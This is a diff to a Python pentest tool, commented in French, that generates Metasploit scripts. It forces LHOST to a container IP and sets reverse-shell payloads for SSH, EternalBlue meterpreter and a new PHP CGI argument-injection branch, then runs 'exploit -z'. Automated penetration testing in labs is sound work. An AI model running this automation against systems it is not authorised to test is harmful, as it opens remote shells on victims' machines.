@@ -959,6 +959,15 @@ set RHOSTS {target}
 set RPORT {port}
 """
         
+        # ✅ CORRECTION CRITIQUE: Toujours forcer l'IP du conteneur toolbox
+        container_ip = "172.20.0.2"  # IP fixe du conteneur app dans docker-compose.yml
+        script += f"set LHOST {container_ip}\n"
+        script += f"set LPORT {options.get('LPORT', '4444')}\n"
+        
+        # ✅ AMÉLIORATION: Log pour debug
+        logger.info(f"🔧 LHOST forcé à: {container_ip}")
+        logger.info(f"🔧 LPORT configuré à: {options.get('LPORT', '4444')}")
+        
         # ✅ GESTION SPÉCIALE POUR SSH EXPLOITS
         if 'ssh' in exploit_module.lower():
             # Pour exploit/multi/ssh/sshexec - credentials requis
@@ -969,21 +978,29 @@ set RPORT {port}
                 # Payload par défaut pour SSH
                 payload = options.get('PAYLOAD', 'linux/x64/shell/reverse_tcp')
                 script += f"set PAYLOAD {payload}\n"
-                
-                # LHOST et LPORT pour reverse shell
-                script += f"set LHOST {options.get('LHOST', '172.20.0.2')}\n"  # IP du conteneur
-                script += f"set LPORT {options.get('LPORT', '4444')}\n"
         
         # ✅ GESTION POUR SMB EXPLOITS
         elif 'smb' in exploit_module.lower():
             if 'eternalblue' in exploit_module or 'ms17_010' in exploit_module:
                 payload = options.get('PAYLOAD', 'windows/x64/meterpreter/reverse_tcp')
                 script += f"set PAYLOAD {payload}\n"
-                script += f"set LHOST {options.get('LHOST', '172.20.0.2')}\n"
-                script += f"set LPORT {options.get('LPORT', '4444')}\n"
             elif 'psexec' in exploit_module:
                 script += f"set SMBUser {options.get('USERNAME', 'administrator')}\n"
                 script += f"set SMBPass {options.get('PASSWORD', 'password')}\n"
+        
+        # ✅ GESTION POUR HTTP EXPLOITS (AMÉLIORATION POUR PHP CGI)
+        elif 'http' in exploit_module.lower():
+            if 'php_cgi_arg_injection' in exploit_module:
+                # Pour PHP CGI, on a besoin d'un payload PHP
+                payload = options.get('PAYLOAD', 'php/reverse_php')
+                script += f"set PAYLOAD {payload}\n"
+                
+                # Options spécifiques pour PHP CGI
+                if 'TARGETURI' not in options:
+                    # Essayer des URIs communes pour PHP CGI
+                    script += "set TARGETURI /cgi-bin/php\n"
+                else:
+                    script += f"set TARGETURI {options['TARGETURI']}\n"
         
         # ✅ GESTION POUR FTP EXPLOITS  
         elif 'ftp' in exploit_module.lower():
@@ -992,20 +1009,25 @@ set RPORT {port}
                 payload = options.get('PAYLOAD', 'cmd/unix/interact')
                 script += f"set PAYLOAD {payload}\n"
         
-        # Ajouter les options personnalisées
+        # Ajouter les options personnalisées (SAUF LHOST qui est forcé)
         for key, value in options.items():
-            if key.upper() not in ['USERNAME', 'PASSWORD', 'PAYLOAD', 'LHOST', 'LPORT']:
-                script += f"set {key.upper()} {value}\n"
+            key_upper = key.upper()
+            # ✅ IGNORE LHOST car on le force toujours
+            if key_upper not in ['USERNAME', 'PASSWORD', 'PAYLOAD', 'LHOST', 'LPORT', 'TARGETURI']:
+                script += f"set {key_upper} {value}\n"
         
-        # ✅ COMMANDES D'EXPLOITATION
+        # ✅ COMMANDES D'EXPLOITATION AMÉLIORÉES
         script += """
 check
+show options
 exploit -z
 sessions -l
 exit
 """
         return script
-    
+
+
+
     def _build_auxiliary_script(self, target: str, port: int, module: str, options: Dict) -> str:
         """Construit un script pour modules auxiliaires - VERSION CORRIGÉE"""
         script = f"""
